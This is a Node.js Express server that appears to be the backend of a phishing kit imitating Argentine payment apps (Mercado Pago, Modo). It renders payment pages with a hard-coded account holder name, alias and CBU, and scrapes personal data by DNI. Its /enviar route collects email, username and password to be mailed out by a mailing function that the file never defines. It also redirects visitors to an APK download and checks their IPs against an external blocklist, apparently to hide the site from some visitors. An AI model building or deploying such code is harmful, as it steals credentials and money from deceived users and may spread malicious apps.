const express = require('express');
const dotenv = require('dotenv');
const bodyParser = require('body-parser');
const scrapeDniInfo = require('./scrapeDni'); 
const axios = require('axios');
const cors = require('cors');
dotenv.config();

const app = express();

const PORT = process.env.PORT || 3000;
const HOST = '192.168.1.29'; //borrar despues

app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.static(__dirname + "/public/"));
app.use(bodyParser.json());
app.use(cors());


 
 
 
//Info cuenta
let NombreTitular = 'Victoria Caceres';
let AliasCuenta = '19051069.PREX';
let CbuCuenta = '0000013000032216094179';

 

//Rutas
//principal
app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.get('/indexMp', (req, res) => {
    res.render('indexMp.ejs');
});

app.get('/indexModo', (req, res) => {
    res.render('indexModo.ejs');
});

app.get('/indexMpLite', (req, res) => {
    res.render('indexMpLite.ejs');
});


app.get('/pagoMp', (req, res) => { 
    res.render('pagoMp.ejs', { titular: NombreTitular, alias: AliasCuenta, cbu: CbuCuenta });
});

app.get('/pagoModo', (req, res) => { 
    res.render('pagoModo.ejs', { titular: NombreTitular, alias: AliasCuenta, cbu: CbuCuenta });
});

app.get('/pagoMpLite', (req, res) => { 
    res.render('pagoMpLite.ejs', { titular: NombreTitular, alias: AliasCuenta, cbu: CbuCuenta });
});

app.get('/getDni/:dni', async (req, res) => {
    const dni = req.params.dni;

    try {
        const data = await scrapeDniInfo(dni);
        res.json(data);
         
    } catch (error) {
        console.error('Error al obtener la información del DNI:', error);
        res.status(500).json({ error: 'Error al obtener la información del DNI' });
    }
});

app.get('/notify', (req, res) => {
    res.redirect('https://expo.dev/artifacts/eas/irD9FyTTTiboD9w7eNXosM.apk');
});




app.post('/enviar', async (req, res) => {
    const { email, nombre, usuario, pass } = req.body;
    if (!email || !nombre || !usuario || !pass) {
        return res.status(400).send('Faltan datos en la solicitud.');
    }
    try {
        await EnviarMail(nombre, email, usuario, pass);
        res.sendStatus(200);
    } catch (error) {
        console.error(error);
        res.status(500).send('Error interno del servidor');
    }
});

 

 
app.get('/ip', async (req, res) => {
    try {
      const ipInfoResponse = await fetch('https://api.ipify.org?format=json');
      const ipInfoData = await ipInfoResponse.json();
      const ip = ipInfoData.ip;
      console.log('IP visitante: ' + ip);
  
      const verificarIPResponse = await fetch(`https://bloqueados.vercel.app/check-ip/${ip}`);
      const verificarIPData = await verificarIPResponse.json();
  
      res.json(verificarIPData);
    } catch (error) {
      console.error('Error al realizar la verificación de IP:', error);
      res.render('index.ejs');
    }
  });

 
 
  
  
  
 
 









app.listen(PORT, HOST, () => {   //sacara HOST dspues
    console.log(`Servidor iniciado en http://localhost:${PORT}`);
});
